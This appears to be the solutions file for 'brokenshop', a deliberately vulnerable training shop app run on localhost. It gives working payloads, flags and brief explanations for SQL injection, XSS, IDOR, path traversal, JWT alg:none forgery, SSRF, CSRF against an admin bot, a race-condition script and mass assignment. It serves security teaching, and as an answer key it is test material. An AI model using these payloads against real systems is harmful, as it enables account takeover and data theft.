# Solutions

Spoilers. Each section gives the exact request and the flag you should see.
Start the app first:

```bash
python -m brokenshop          # http://127.0.0.1:8000
```

Shorthand used below: `BASE=http://127.0.0.1:8000`

## 1. SQL injection → `FLAG{sql1_byp4ss}`

The query is:

```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret'
```

Send a username that closes the quote and comments out the password check:

```bash
curl -i -c jar.txt -d "username=admin' -- " -d "password=whatever" $BASE/login
curl -b jar.txt $BASE/admin
```

```text
private note: FLAG{sql1_byp4ss}
```

Why it works: `--` starts a comment in SQLite, so everything after it — including
the password condition — is ignored. The query becomes "select the admin row".

## 2. XSS → browser only

Reflected:

```bash
curl "$BASE/?q=<script>alert(document.domain)</script>"
```

The payload appears unescaped in the HTML. Open the same URL in a browser and the
script executes.

Stored:

1. Log in as `bob` / `hunter2`
2. Post a review containing `<img src=x onerror=alert(1)>`
3. Open `/reviews` — the image fails to load, `onerror` fires

There is no flag string for this one; the "win" is script execution in the
page's origin. See challenge 6 for why that matters.

## 3a. IDOR → `FLAG{1d0r_0rd3r}`

```bash
curl -c jar.txt -d "username=alice" -d "password=password123" $BASE/login
curl -b jar.txt $BASE/orders/2
```

Order 2 belongs to the admin. The handler fetches by id and never compares
`order.user_id` to the session user.

## 3b. Path traversal → `FLAG{tr4v3rs4l}`

```bash
curl "$BASE/download?file=../secret/flag.txt"
```

`data/receipts/` + `../secret/flag.txt` = `data/secret/flag.txt`, which holds the
flag.

## 4. JWT `alg:none` → `FLAG{jwt_n0n3_4lg}`

```bash
python3 - <<'PY'
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()
print(b64({"alg":"none","typ":"JWT"}) + "." + b64({"sub":"x","role":"admin"}) + ".")
PY
```

Take that token and call:

```bash
curl "$BASE/api/admin?token=<token>"
```

```json
{ "ok": true, "claims": {"sub": "x", "role": "admin"}, "flag": "FLAG{jwt_n0n3_4lg}" }
```

Why: `jwt_decode` reads `alg` from the token header and treats `none` as "no
signature required".

## 5. SSRF → `FLAG{ssrf_1nt3rn4l}`

```bash
curl "$BASE/fetch?url=http://127.0.0.1:8000/internal/flag"
```

`/internal/flag` allows only requests from localhost. You are not localhost —
but the server is, and it makes the request for you.

## 6. CSRF → `FLAG{csrf_b0t}`

The gift endpoint is `POST /admin/gift` with `to` and `amount`, no CSRF token.

1. Log in as `alice`
2. Upload an auto-submitting page:

```bash
curl -b jar.txt --data-urlencode "html=<form action='/admin/gift' method='post'><input name='to' value='alice'><input name='amount' value='1000'></form>" $BASE/upload
```

The response contains `/uploads/<token>.html`. Send it to the admin bot:

```bash
curl -b jar.txt -d "url=/uploads/<token>.html" $BASE/report
```

The bot logs in as admin, visits your page, finds the form, submits it. Your
balance becomes 1100.

3. Buy the Platinum Duck (product 3) and read the order:

```bash
curl -b jar.txt -d "id=3" $BASE/buy -i | grep -i location
curl -b jar.txt $BASE/orders/<order-id>
```

```text
FLAG{csrf_b0t}
```

## 7. Race condition → `FLAG{r4c3_c0nd1t10n}`

The coupon is worth 10 coins; the Golden Duck costs 50. Fire parallel requests so
several pass the `used` check before any of them writes:

```bash
python3 - <<'PY'
import concurrent.futures, http.cookiejar, urllib.request, urllib.parse
BASE = "http://127.0.0.1:8000"
jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
op.open(BASE + "/login", data=urllib.parse.urlencode({"username":"bob","password":"hunter2"}).encode())
def redeem(_): 
    with op.open(BASE + "/redeem", data=b"") as r: return r.status
with concurrent.futures.ThreadPoolExecutor(max_workers=12) as pool:
    print(list(pool.map(redeem, range(12))))
PY
```

Then buy product 2:

```bash
curl -b jar.txt -d "id=2" $BASE/buy -i | grep -i location
curl -b jar.txt $BASE/orders/<order-id>
```

```text
FLAG{r4c3_c0nd1t10n}
```

Why: `SELECT` → `sleep(0.05)` → `UPDATE` is not atomic. Multiple threads read
`used = 0` before any writes `used = 1`.

## 8. Mass assignment → `FLAG{m4ss_4ss1gnm3nt}`

```bash
curl -b jar.txt -d "role=admin" $BASE/account
curl -b jar.txt $BASE/admin
```

```text
escalation bonus
FLAG{m4ss_4ss1gnm3nt}
```

Why: `_account_update` builds `UPDATE users SET <every submitted field>` from an
allowlist that includes `role` and `coins`.

---

## After you finish

Read [FIXES.md](FIXES.md). For each challenge it shows the vulnerable line and
the secure replacement, and explains what invariant the fix restores. Being able
to explain the fix is the difference between "I ran a tool" and "I understand the
bug".
